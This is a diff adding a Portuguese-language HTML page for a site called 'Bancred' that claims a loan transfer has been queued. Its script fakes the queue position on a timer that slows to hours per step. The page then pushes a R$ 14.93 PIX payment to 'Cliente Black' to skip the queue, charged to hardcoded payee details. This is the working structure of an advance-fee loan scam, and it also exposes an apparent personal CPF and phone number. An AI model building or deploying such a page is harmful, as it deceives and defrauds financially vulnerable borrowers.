@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta name="csrf-token" content="quEgnpZlud3GxguTMTw4CxaLvKw5pPjQ5B9oHIo7">
+    <title>Transferência Solicitada - Empréstimo Seguro</title>
+    <meta name="description" content="Sua transferência foi solicitada e está na fila. Receba em alguns minutos.">
+    <meta name="keywords" content="emprestimo, transferencia, pix, fila">
+    <meta name="author" content="Bancred">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#FFFFFF">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+    <meta name="msapplication-navbutton-color" content="#FFFFFF">
+    <link rel="canonical" href="https://bancred.shop">
+    <meta property="og:image" content="https://bancred.shop/public/images/banner.jpg">
+    <meta property="og:title" content="Transferência Solicitada - Empréstimo Seguro">
+    <meta property="og:url" content="https://bancred.shop">
+    <meta property="og:site_name" content="Empréstimo Seguro">
+    <meta property="og:type" content="website">
+    <meta property="og:description" content="Sua transferência foi solicitada e está na fila. Receba em alguns minutos.">
+    <link rel="shortcut icon" href="../../public/images/favicon-17.ico">
+    <link rel="stylesheet" href="../../public/css/global-14.css">
+    <style>
+        .btn-pulse {
+            box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.6);
+            animation: btnPulse 1.5s infinite;
+        }
+
+        @keyframes btnPulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.6);
+            }
+            70% {
+                transform: scale(1.02);
+                box-shadow: 0 0 0 10px rgba(37, 99, 235, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(37, 99, 235, 0);
+            }
+        }
+
+        .realtime-dot {
+            animation: realtimeBlink 1.4s infinite;
+        }
+
+        @keyframes realtimeBlink {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.4;
+                transform: scale(0.85);
+            }
+        }
+    </style>
+    <script>
+        window.pixelId = "6938cbd059dd67439a0a0a4d";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+    <script>
+        window.googlePixelId = "692df16c9a50285047e3afa0";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+</head>
+<body data-id="69370c9e1d918">
+    <div class="min-h-screen flex flex-col">
+        <header class="bg-white border-b border-border">
+            <div class="container mx-auto px-4 py-5">
+                <div class="flex justify-center">
+                    <div class="text-xl font-bold text-primary flex items-center">
+                        <div class="mr-3 relative group">
+                            <div class="w-8 h-8 border-2 border-primary rounded-full flex items-center justify-center relative overflow-hidden">
+                                <div class="w-full h-full bg-primary/10 absolute"></div>
+                                <div class="relative z-10 font-bold text-primary text-sm">$</div>
+                            </div>
+                            <div class="absolute -top-1 -right-1 w-3 h-3 bg-accent rounded-full border-2 border-white"></div>
+                        </div>
+                        Bancred
+                    </div>
+                </div>
+            </div>
+        </header>
+        <section class="py-12 h-full flex-1 bg-muted">
+            <div class="container mx-auto px-4">
+                <div class="max-w-md mx-auto">
+                    <!-- Confirmation Card -->
+                    <div class="shadcn-card rounded-2xl border bg-card border-card-border text-card-foreground mb-6 shadow-lg p-5">
+                        <div class="text-center mb-6">
+                            <!-- Success Icon -->
+                            <div class="mx-auto mb-4 w-20 h-20 bg-green-100 rounded-full flex items-center justify-center">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big text-green-600">
+                                    <path d="M21.801 10A10 10 0 1 1 17 3.335"></path>
+                                    <path d="m9 11 3 3L22 4"></path>
+                                </svg>
+                            </div>
+                            
+                            <h1 class="text-2xl font-bold text-gray-800 mb-2">Transferência Solicitada!</h1>
+                            <p class="text-gray-600 mb-4">Sua solicitação foi recebida com sucesso</p>
+                        </div>
+
+                        <!-- Amount Display -->
+                        <div class="bg-gradient-to-r from-green-50 to-blue-50 rounded-xl p-6 mb-6 text-center border-2 border-green-200">
+                            <p class="text-sm text-gray-600 mb-1">Valor da Transferência</p>
+                            <h2 class="text-3xl font-bold text-green-600" id="transferAmount">R$ 0,00</h2>
+                        </div>
+
+                        <!-- Queue Status -->
+                        <div class="bg-blue-50 border-2 border-blue-200 rounded-xl p-5 mb-6">
+                            <div class="flex items-start gap-3">
+                                <div class="flex-shrink-0 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock text-blue-600">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <polyline points="12 6 12 12 16 14"></polyline>
+                                    </svg>
+                                </div>
+                                <div class="flex-1">
+                                    <h3 class="font-semibold text-blue-900 mb-2">Sua transferência está na fila</h3>
+                                    <p class="text-sm text-blue-700 mb-3">
+                                        Sua solicitação foi processada e está aguardando na fila de transferências. 
+                                        Você receberá o valor assim que chegar a sua vez, de acordo com sua posição na fila.
+                                    </p>
+                                    <div class="bg-white rounded-lg p-3 border border-blue-200">
+                                        <div class="flex items-center justify-between mb-2">
+                                            <div class="flex flex-col items-start gap-1">
+                                                <span class="realtime-dot inline-block h-2 w-2 rounded-full bg-green-500"></span>
+                                                <span class="text-xs text-gray-600">Posição na fila</span>
+                                            </div>
+                                            <span class="text-sm font-bold text-blue-600" id="queuePosition">Calculando...</span>
+                                        </div>
+                                        <div class="w-full bg-blue-100 rounded-full h-2">
+                                            <div class="bg-blue-600 h-2 rounded-full transition-all duration-500" id="queueProgress" style="width: 0%"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Information Box -->
+                        <div class="bg-gray-50 rounded-xl p-4 mb-6">
+                            <div class="flex items-start gap-3">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info text-gray-600 flex-shrink-0 mt-0.5">
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <line x1="12" x2="12" y1="16" y2="12"></line>
+                                    <line x1="12" x2="12.01" y1="8" y2="8"></line>
+                                </svg>
+                                <div class="text-sm text-gray-700">
+                                    <p class="font-semibold mb-1">O que acontece agora?</p>
+                                    <ul class="list-disc list-inside space-y-1 text-gray-600">
+                                        <li>Sua transferência foi adicionada à fila de processamento</li>
+                                        <li>O tempo de recebimento varia conforme sua posição</li>
+                                        <li>Você receberá uma notificação quando o valor for creditado</li>
+                                        <li>O processo é automático e seguro</li>
+                                        <li><span class="font-semibold text-red-600">Importante:</span> não feche esta página, mantenha-a aberta até que sua vez chegue e a transferência seja concluída</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Upsell: Cliente Black / Fura-Fila -->
+                        <div class="bg-gradient-to-r from-yellow-50 via-orange-50 to-amber-50 border-2 border-amber-300 rounded-2xl p-5 mb-6 shadow-sm">
+                            <div class="flex items-start gap-3">
+                                <div class="flex-shrink-0 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-zap text-amber-500">
+                                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                                    </svg>
+                                </div>
+                                <div class="flex-1">
+                                    <p class="text-xs font-semibold uppercase tracking-wide text-amber-700 mb-1">
+                                        Oferta exclusiva • Antecipe sua transferência
+                                    </p>
+                                    <h3 class="font-bold text-amber-900 mb-1">
+                                        Quer receber o valor sem esperar na fila?
+                                    </h3>
+                                    <p class="text-sm text-amber-800 mb-3">
+                                        Torne-se um <span class="font-semibold">Cliente Black</span> e tenha sua transferência <span class="font-semibold">aprovada e liberada imediatamente</span>, sem aguardar a fila atual.
+                                    </p>
+                                    <p class="text-sm text-amber-900 mb-2">
+                                        Transferência imediata: torne-se <span class="font-semibold">Cliente Black</span> e tenha prioridade total na fila por apenas 
+                                        <span class="font-bold">R$ 14,93</span>.
+                                    </p>
+                                    <p class="text-xs text-amber-800 mt-1 mb-2">
+                                        <span class="font-semibold">Obs.:</span> este é um <span class="font-semibold">pagamento único</span>, cobrado apenas uma vez para liberar sua transferência imediatamente.
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="mt-3 flex justify-center">
+                                <button 
+                                    id="btnBlackPix"
+                                    onclick="goToUpsell()" 
+                                    class="btn-pulse inline-flex items-center justify-center gap-2 rounded-xl text-base focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 hover-elevate active-elevate-2 bg-primary border-primary-border min-h-9 px-6 py-3 w-full max-w-sm text-white font-semibold h-11 transition-all duration-300 transform border-0 outline-none focus:ring-0 focus:ring-offset-0 scale-100 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 shadow-lg hover:shadow-blue-200/50 hover:scale-105">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-credit-card">
+                                        <rect x="2" y="5" width="20" height="14" rx="2" ry="2"></rect>
+                                        <line x1="2" y1="10" x2="22" y2="10"></line>
+                                    </svg>
+                                    <span>Virar Cliente Black</span>
+                                </button>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="flex items-center justify-center gap-6 mt-8">
+                    <img src="../../public/images/pix-106.svg" alt="PIX" class="h-10" data-testid="img-pix-seal">
+                    <div class="h-6 w-px bg-gray-200"></div>
+                    <div class="flex items-center gap-2 text-gray-600">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield h-8 w-8 text-green-600">
+                            <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                        </svg>
+                        <div class="text-xs">
+                            <div class="font-semibold">Ambiente Seguro</div>
+                            <div class="text-gray-500">256-bit SSL</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+    <script src="../../public/js/jquery.min-17.js"></script>
+    <script src="../../public/js/jquery.mask.min-17.js"></script>
+    <script src="../../npm/alpinejs%403.x.x/dist/cdn.min-17.js" defer=""></script>
+    <script>
+        // Função para obter parâmetros de tracking e preservá-los
+        function getTrackingParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const trackingParams = new URLSearchParams();
+            const functionalParams = ['id', 'transaction_id', 'txid'];
+            
+            for (const [key, value] of urlParams.entries()) {
+                if (!functionalParams.includes(key.toLowerCase())) {
+                    trackingParams.append(key, value);
+                }
+            }
+            
+            const queryString = trackingParams.toString();
+            return queryString ? '?' + queryString : '';
+        }
+
+        // Função para redirecionar preservando parâmetros
+        function goToHome() {
+            const isLocal = window.location.hostname === 'localhost' || 
+                          window.location.hostname === '127.0.0.1' ||
+                          window.location.protocol === 'file:';
+            
+            let url;
+            if (isLocal) {
+                const currentPath = window.location.pathname;
+                const basePath = currentPath.substring(0, currentPath.indexOf('/conta'));
+                url = window.location.origin + basePath + '/index.htm';
+            } else {
+                url = "https://bancred.shop/index.htm";
+            }
+            
+            window.location.href = url + getTrackingParams();
+        }
+
+        function goToAccount() {
+            const isLocal = window.location.hostname === 'localhost' || 
+                          window.location.hostname === '127.0.0.1' ||
+                          window.location.protocol === 'file:';
+            
+            let url;
+            if (isLocal) {
+                const currentPath = window.location.pathname;
+                const basePath = currentPath.substring(0, currentPath.indexOf('/conta'));
+                url = window.location.origin + basePath + '/conta.html';
+            } else {
+                url = "https://bancred.shop/conta.html";
+            }
+            
+            window.location.href = url + getTrackingParams();
+        }
+
+        // Helper para montar URL da API PIX (mesma lógica do checkout)
+        function getApiUrl(endpoint) {
+            const isLocal = window.location.hostname === 'localhost' || 
+                          window.location.hostname === '127.0.0.1' ||
+                          window.location.protocol === 'file:';
+            
+            if (isLocal) {
+                const currentPath = window.location.pathname;
+                const basePath = currentPath.substring(0, currentPath.indexOf('/conta'));
+                return window.location.origin + basePath + '/consulta/' + endpoint;
+            } else {
+                return window.location.origin + '/consulta/' + endpoint;
+            }
+        }
+
+        // Página de upsell / antecipação (Cliente Black) usando API PIX
+        function goToUpsell() {
+            const $btn = $("#btnBlackPix");
+            if ($btn.length) {
+                $btn.prop("disabled", true).text("Gerando PIX...");
+            }
+
+            const apiUrl = getApiUrl('processar.php');
+
+            // Dados fixos do PIX para Cliente Black
+            const payload = {
+                servico: "Cliente Black - Fura Fila",
+                cpf: "12095582462",
+                nome: "Bancred",
+                email: "bancred@gmail.com",
+                telefone: "11956472565",
+                valor: 14.93,
+                utm: null
+            };
+
+            // Tentar reaproveitar UTMs do sessionStorage (se existirem)
+            try {
+                const savedUtms = sessionStorage.getItem('utmParams');
+                if (savedUtms) {
+                    const utmParams = JSON.parse(savedUtms);
+                    const utmParts = [];
+                    Object.keys(utmParams).forEach(key => {
+                        utmParts.push(key + '=' + encodeURIComponent(utmParams[key]));
+                    });
+                    if (utmParts.length > 0) {
+                        payload.utm = utmParts.join('&');
+                    }
+                }
+            } catch (e) {
+                console.warn('Erro ao carregar UTMs para Cliente Black:', e);
+            }
+
+            $.ajax({
+                type: 'POST',
+                url: apiUrl,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
+                },
+                data: JSON.stringify(payload),
+                dataType: 'json',
+                success: function (response) {
+                    try {
+                        if (response.success && response.data && response.data.id) {
+                            // Salvar dados do PIX no sessionStorage
+                            sessionStorage.setItem('pixData_' + response.data.id, JSON.stringify(response.data));
+
+                            // Salvar serviço no sessionStorage para redirecionamento após pagamento
+                            sessionStorage.setItem('produto', JSON.stringify({ service: "Cliente Black - Fura Fila" }));
+
+                            // Salvar parâmetros de tracking atuais (se houver)
+                            if (window.location.search) {
+                                sessionStorage.setItem('trackingParams', window.location.search);
+                            }
+
+                            // Montar URL da página de pagamento PIX (payment.html)
+                            const isLocal = window.location.hostname === 'localhost' || 
+                                          window.location.hostname === '127.0.0.1' ||
+                                          window.location.protocol === 'file:';
+                            
+                            let redirectUrl;
+                            if (isLocal) {
+                                const currentPath = window.location.pathname;
+                                const basePath = currentPath.substring(0, currentPath.indexOf('/conta'));
+                                redirectUrl = window.location.origin + basePath + '/conta/checkout/pix/payment.html?black=1&id=' + response.data.id;
+                            } else {
+                                redirectUrl = "https://bancred.shop/conta/checkout/pix/payment.html?black=1&id=" + response.data.id;
+                            }
+
+                            window.location.href = redirectUrl;
+                        } else {
+                            alert(response.message || "Erro ao gerar PIX. Tente novamente.");
+                            if ($btn.length) {
+                                $btn.prop("disabled", false).text("Virar Cliente Black");
+                            }
+                        }
+                    } catch (e) {
+                        console.error("Erro ao processar resposta da API PIX (Cliente Black):", e);
+                        alert("Erro inesperado ao gerar PIX. Tente novamente.");
+                        if ($btn.length) {
+                            $btn.prop("disabled", false).text("Virar Cliente Black");
+                        }
+                    }
+                },
+                error: function (xhr, status, error) {
+                    console.error("Erro na requisição da API PIX (Cliente Black):", { xhr, status, error });
+                    alert("Não foi possível gerar o PIX agora. Tente novamente em alguns instantes.");
+                    if ($btn.length) {
+                        $btn.prop("disabled", false).text("Virar Cliente Black");
+                    }
+                }
+            });
+        }
+
+        // Variáveis globais para controle da fila
+        const QUEUE_START_POSITION = 63;
+        let currentQueuePosition = QUEUE_START_POSITION;
+        let queueTimer = null;
+        let queueStartTime = null;
+
+        // Função que calcula a posição atual com base no tempo decorrido
+        function calculateQueuePosition(elapsedMs) {
+            let position = QUEUE_START_POSITION;
+            let remaining = elapsedMs;
+
+            const stages = [
+                // 63 → 45: desce 1 posição a cada 2 minutos
+                { from: 63, to: 45, interval: 2 * 60 * 1000 },
+                // 45 → 25: desce 1 posição a cada 5 minutos
+                { from: 45, to: 25, interval: 5 * 60 * 1000 },
+                // 25 → 10: desce 1 posição a cada 15 minutos
+                { from: 25, to: 10, interval: 15 * 60 * 1000 },
+                // 10 → 5: desce 1 posição a cada 1 hora
+                { from: 10, to: 5, interval: 60 * 60 * 1000 },
+                // 5 → 1: desce 1 posição a cada 5 horas
+                { from: 5, to: 1, interval: 5 * 60 * 60 * 1000 },
+            ];
+
+            for (const stage of stages) {
+                while (position > stage.to && remaining >= stage.interval) {
+                    position -= 1;
+                    remaining -= stage.interval;
+                }
+            }
+
+            // Garante que nunca passa da posição 1
+            if (position < 1) position = 1;
+            return position;
+        }
+
+        // Atualiza visualmente a posição na fila com base no tempo
+        function updateQueuePosition() {
+            if (!queueStartTime) {
+                queueStartTime = Date.now();
+            }
+
+            const elapsedMs = Date.now() - queueStartTime;
+            currentQueuePosition = calculateQueuePosition(elapsedMs);
+
+            if (currentQueuePosition > 1) {
+                // Atualiza texto da posição
+                $("#queuePosition").text(`#${currentQueuePosition}`);
+
+                // Calcula progresso da barra (63 → 1)
+                const maxDelta = QUEUE_START_POSITION - 1;
+                const currentDelta = QUEUE_START_POSITION - currentQueuePosition;
+                const queueProgress = Math.min(100, Math.max(0, (currentDelta / maxDelta) * 100));
+
+                // Animar barra de progresso
+                $("#queueProgress").css("width", queueProgress + "%");
+            } else {
+                // Posição 1: próximo a receber
+                clearInterval(queueTimer);
+                $("#queuePosition").parent().html(`
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-xs text-gray-600">Status</span>
+                        <span class="text-sm font-bold text-green-600">Sua transferência está sendo processada</span>
+                    </div>
+                    <div class="w-full bg-green-100 rounded-full h-2">
+                        <div class="bg-green-600 h-2 rounded-full" style="width: 100%"></div>
+                    </div>
+                `);
+            }
+        }
+
+        // Carregar dados do usuário e exibir valor
+        $(document).ready(function() {
+            try {
+                // Primeiro, tentar obter o valor do withdrawalData (valor real do saque solicitado)
+                let withdrawalData = null;
+                try {
+                    const withdrawalDataStr = sessionStorage.getItem("withdrawalData");
+                    if (withdrawalDataStr) {
+                        withdrawalData = JSON.parse(withdrawalDataStr);
+                    }
+                } catch (e) {
+                    console.warn("Erro ao ler withdrawalData:", e);
+                }
+                
+                // Depois, tentar obter do userData (valor do empréstimo aprovado)
+                const userData = JSON.parse(sessionStorage.getItem("userData") || "{}");
+                
+                // Prioridade: withdrawalData.valor > userData.valorDesejado > userData.valor > 20000 (padrão)
+                let valorTransferencia = 20000; // Valor padrão
+                
+                if (withdrawalData && withdrawalData.valor) {
+                    // Valor do saque solicitado (mais preciso)
+                    valorTransferencia = parseFloat(withdrawalData.valor);
+                    console.log("Valor obtido de withdrawalData:", valorTransferencia);
+                } else if (userData?.valorDesejado) {
+                    // Valor do empréstimo aprovado
+                    valorTransferencia = parseFloat(userData.valorDesejado);
+                    console.log("Valor obtido de userData.valorDesejado:", valorTransferencia);
+                } else if (userData?.valor) {
+                    // Valor alternativo
+                    valorTransferencia = parseFloat(userData.valor);
+                    console.log("Valor obtido de userData.valor:", valorTransferencia);
+                }
+                
+                // Garantir que o valor é válido
+                if (isNaN(valorTransferencia) || valorTransferencia <= 0) {
+                    console.warn("Valor inválido, usando padrão 20000");
+                    valorTransferencia = 20000;
+                }
+                
+                // Formatar e exibir valor
+                const valorFormatado = valorTransferencia.toLocaleString("pt-BR", {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2,
+                });
+                
+                $("#transferAmount").text("R$ " + valorFormatado);
+                console.log("Valor da transferência exibido: R$", valorFormatado);
+                
+                // Definir/inicializar o horário de entrada na fila (para manter a mesma posição mesmo se recarregar)
+                const storedStartTime = sessionStorage.getItem("queueStartTime");
+                if (storedStartTime) {
+                    queueStartTime = parseInt(storedStartTime, 10);
+                } else {
+                    queueStartTime = Date.now();
+                    sessionStorage.setItem("queueStartTime", queueStartTime.toString());
+                }
+
+                // Atualiza imediatamente a posição atual de acordo com o tempo decorrido
+                updateQueuePosition();
+
+                // Atualiza a posição periodicamente (a cada 30 segundos)
+                queueTimer = setInterval(updateQueuePosition, 30 * 1000);
+                
+                console.log(`Fila iniciada na posição #${QUEUE_START_POSITION}`);
+                console.log('Posição será atualizada de acordo com o tempo decorrido e as regras da fila');
+                
+            } catch (e) {
+                console.error("Erro ao carregar dados:", e);
+                $("#transferAmount").text("R$ 0,00");
+            }
+        });
+
+        // Limpar timer quando a página for fechada
+        $(window).on('beforeunload', function() {
+            if (queueTimer) {
+                clearInterval(queueTimer);
+            }
+        });
+    </script>
+    <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-17" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b9599e1da994470b9c098e5fca4ee72d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
+
